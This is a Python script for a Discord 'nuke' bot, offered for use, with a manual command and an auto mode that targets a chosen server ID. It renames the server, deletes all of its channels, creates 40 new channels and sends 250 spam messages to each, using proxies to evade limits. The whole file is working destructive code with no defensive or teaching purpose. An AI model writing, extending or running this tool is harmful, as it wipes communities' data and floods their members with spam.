import discord
from discord.ext import commands
import random
import asyncio
import aiohttp


print("\033[35m" + r"""

███╗   ███╗ █████╗ ██████╗ ███████╗    ██████╗ ██╗   ██╗    ██████╗ ██████╗ ██████╗ ██╗  ██╗
████╗ ████║██╔══██╗██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝    ╚════██╗╚════██╗╚════██╗╚██╗██╔╝
██╔████╔██║███████║██║  ██║█████╗      ██████╔╝ ╚████╔╝      █████╔╝ █████╔╝ █████╔╝ ╚███╔╝ 
██║╚██╔╝██║██╔══██║██║  ██║██╔══╝      ██╔══██╗  ╚██╔╝       ╚═══██╗ ╚═══██╗██╔═══╝  ██╔██╗ 
██║ ╚═╝ ██║██║  ██║██████╔╝███████╗    ██████╔╝   ██║       ██████╔╝██████╔╝███████╗██╔╝ ██╗
╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝    ╚═════╝    ╚═╝       ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                            

""" + "\033[0m")

token = input("Enter your bot token: ")

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
client = commands.Bot(command_prefix=".", intents=intents)

async def get_proxy_session(proxy_list):
    proxy = random.choice(proxy_list) if proxy_list else None
    if proxy:
        return aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False), headers={"User-Agent": "Mozilla/5.0"}, proxy=f"http://{proxy}")
    return aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False), headers={"User-Agent": "Mozilla/5.0"})

@client.event
async def on_ready():
    print(f"Logged in as {client.user}")
    print("\nChoose an option:\n1. Manual Nuke (Nuke with .nuke command)\n2. Auto Nuke (Choose a server ID to nuke)")
    option = input("Enter option (1 or 2): ")

    if option == "1":
        
        channel_file_path = input("Enter the path to the channel names file: ")
        message_file_path = input("Enter the path to the messages file: ")
        proxy_file_path = input("Enter the path to the proxy file: ")
        new_server_name = input("Enter the new server name: ")

        with open(channel_file_path, "r") as f:
            NUKE_CHANNEL = [line.strip() for line in f.readlines() if line.strip()]

        with open(message_file_path, "r") as f:
            NUKE_MESSAGES = [line.strip() for line in f.readlines() if line.strip()]

        with open(proxy_file_path, "r") as f:
            proxies = [line.strip() for line in f.readlines() if line.strip()]

        @client.command()
        async def nuke(ctx):
            await ctx.guild.edit(name=new_server_name)
            print(f"Server name changed to {ctx.guild.name}")

            delete_tasks = [channel.delete() for channel in ctx.guild.channels]
            await asyncio.gather(*delete_tasks)
            await asyncio.sleep(1)

            new_channels = [ctx.guild.create_text_channel(random.choice(NUKE_CHANNEL)) for _ in range(40)]
            created_channels = await asyncio.gather(*new_channels)

            async def send_nuke_message(channel):
                for _ in range(250):
                    session = await get_proxy_session(proxies)
                    try:
                        await channel.send(random.choice(NUKE_MESSAGES))
                    finally:
                        await session.close()

            await asyncio.gather(*(send_nuke_message(channel) for channel in created_channels))

            print(f"Server nuked: {ctx.guild.name}")
            await ctx.send("The server has been NUKED by ( edgy tool name ).")

    elif option == "2":
        
        print("\nThe bot is in the following servers:")
        server_map = {}
        for guild in client.guilds:
            invite_link = await guild.text_channels[0].create_invite(max_age=0, max_uses=0) if guild.text_channels else "No invite link"
            print(f"Server: {guild.name} | ID: {guild.id} | Invite: {invite_link}")
            server_map[guild.id] = guild

        target_server_id = int(input("\nEnter the server ID to nuke: "))

        if target_server_id in server_map:
            target_guild = server_map[target_server_id]

            channel_file_path = input("Enter the path to the channel names file: ")
            message_file_path = input("Enter the path to the messages file: ")
            proxy_file_path = input("Enter the path to the proxy file: ")
            new_server_name = input("Enter the new server name: ")

            with open(channel_file_path, "r") as f:
                NUKE_CHANNEL = [line.strip() for line in f.readlines() if line.strip()]

            with open(message_file_path, "r") as f:
                NUKE_MESSAGES = [line.strip() for line in f.readlines() if line.strip()]

            with open(proxy_file_path, "r") as f:
                proxies = [line.strip() for line in f.readlines() if line.strip()]

            async def auto_nuke():
                await target_guild.edit(name=new_server_name)
                print(f"Server name changed to {target_guild.name}")

                delete_tasks = [channel.delete() for channel in target_guild.channels]
                await asyncio.gather(*delete_tasks)
                await asyncio.sleep(1)

                new_channels = [target_guild.create_text_channel(random.choice(NUKE_CHANNEL)) for _ in range(40)]
                created_channels = await asyncio.gather(*new_channels)

                async def send_nuke_message(channel):
                    for _ in range(250):
                        session = await get_proxy_session(proxies)
                        try:
                            await channel.send(random.choice(NUKE_MESSAGES))
                        finally:
                            await session.close()

                await asyncio.gather(*(send_nuke_message(channel) for channel in created_channels))

                print(f"Server nuked: {target_guild.name}")

            await auto_nuke()

client.run(token)
